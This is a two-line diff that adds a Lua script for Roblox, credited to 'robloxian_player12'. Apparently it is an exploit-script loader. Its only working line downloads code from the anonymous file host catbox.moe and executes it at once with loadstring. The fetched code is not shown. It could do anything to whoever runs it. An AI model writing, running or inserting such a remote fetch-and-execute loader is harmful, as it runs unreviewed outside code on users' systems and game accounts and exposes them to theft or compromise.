@@ -1,0 +1,2 @@
+-- Credit by robloxian_player12
+loadstring(game:HttpGet("https://files.catbox.moe/7uriej.txt"))()
